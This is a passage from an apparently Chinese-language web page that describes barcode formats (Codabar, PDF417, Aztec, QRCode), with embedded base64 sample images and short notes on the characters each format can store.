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n/99dven4SEBC29YsUKLf3qq6/KsWPHRESkTJkykpSUZDOc3AwCAgLEzU3/z2F6erqWbtCggZYuuAHhKH9/f62NrKwsycnJcbj83r17ZdeuXUY6MjJSqlWr5lQfRER++OEHLf3UU085Vb5FixZaOiUlpcQybm5u0q1bN1m4cKGcO3dOsrOz5dy5c3Lt2jXZt2+f/OMf/5Dg4GAj/969e7XyjRo10tJlypSRwMBAI52ZmSkZGRlOncepU6e0oLl69epSvnx5p+pwRN26daVdu3ZGOjc3V/bt22ekL126JBs3bjTSZloFHgBw5xGsA8Bd4MyZM9KqVSttL+bg4GDZuHHjHduTuW7dulr65MmTcv36dSM9c+ZM4312drY0b95cLBZLia/CT+xFRF588UXtc2fnepckOzvbZisu6/nbDz30kJY+c+aMU21cv35da8PT09OpLceWLl2qpaOjo51qX0QkPz/f5il0UFCQU3VYP32+ePGiw/vZF/Dy8jL2crdn06ZNWto6WBcRm+31du7c6VQftm/fXmwbWVlZsmbNGhk/frx2k8QV1iMDCt9YWLlypbZlniN/y+rG4sAlvorbig8AcHdggTkAMLlLly5JdHS07N692zjWvHlzWbx4sVStWtWlOk+ePClffPGFpKWlyenTp8Viscg333zjVB2FA/MChYcnO/v0+U4pePpfwNPTUypWrKgde+ihh8TLy8t4Gr59+3ZRStldXM0e6yHXhYeDOyI5OVlLt2nTxqnyIjeCdevvpKi9xYvi6mJujsrKypLVq1cb6fvuu0/CwsJs8j3++OPaInmrV6+W1q1bO9zOypUrtXRkZKTxPikpSXr27Gn8vjMyMuzeMHCU9TUuV66c8X758uXG+4CAAGnatKnL7QAA7j08WQcAE8vLy5P4+HjtyWGLFi3khx9+cDlQLzBmzBj517/+JYsXL5ZFixZJamqqU+ULVngvYG84+a12+fJlmT59urz77rvSr18/6dKli92bCMWxHhretGlTmyC8XLly2tPsjIwMWbduncNtFB7qLCLy8MMPO1z24sWLsmHDBiPt6+trs6K4Izw8PGzmQ1vfqCiJdX4fHx/x9vZ2ui9FmT2ybbNiAAAJWklEQVR7thbcdurUSdzd3W3ytW3bVktb38wojlJKvv32W+1Y4dEazZo1035D06ZNk0uXLjlcv7XC3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" alt="Codabar">
<figcaption aria-hidden="true">Codabar</figcaption>
</figure>
<p>也被称作“血库用码”; 能存储数字 (0-9) 和字符 ($/-:+); 无校验码。</p>
<h2 id="pdf417-二维条形码">PDF417 二维条形码</h2>
<figure>
<img src="data:image/png;base64,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" alt="PDF417">
<figcaption aria-hidden="true">PDF417</figcaption>
</figure>
<p>能存储所有ASCII字符。</p>
<h2 id="aztec-二维码">Aztec 二维码</h2>
<figure>
<img src="data:image/png;base64,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" alt="Aztec">
<figcaption aria-hidden="true">Aztec</figcaption>
</figure>
<p>能存储所有 ASCII 字符。</p>
<h2 id="qrcode-二维码">QRCode 二维码</h2>
<figure>
<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAALwAAADSCAYAAADwt6qBAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAgY0hSTQAAeiYAAICEAAD6AAAAgOgAAHUwAADqYAAAOpgAABdwnLpRPAAAEPtJREFUeJzt3XtQVOX/B/D3cme5CXhZEbxxxwuDOiBlkcrYDDGTMzmOjqVmiqJMaWblQOlYkmRMapo3cLyLow1dLB21gshxNGUEBXOwSDMkvKQiJIJ8fn/49fzcgAVWdl183q+ZHd1znnPOc3bfPOx+OBediAiIFGH3uDtAZE0MPCmFgSelMPCkFAaelMLAk1IcTM3U6XTW6ofFmKq6mto/a1drrf1am/u6dBYt7R9HeFIKA09KYeBJKQw8KYWBJ6Uw8KQUk2VJU2zpIEtbKqNZoi/mvta21BdLMGf/OMKTUhh4UgoDT0ph4EkpDDwphYEnpZhdljTlSSiHmXskpS0dnWlLr5m5OnofOMKTUhh4UgoDT0ph4EkpDDwphYEnpVikLPmks0R50dySni2VQTsDjvCkFAaelMLAk1IYeFIKA09KYeBJKUqXJZ+E6yt2ln7aCo7wpBQGnpTCwJNSGHhSCgNPSmHgSSkWKUt2liPxOsttZmzp2pKmdIb3nSM8KYWBJ6Uw8KQUBp6UwsCTUhh4UorZZckn/S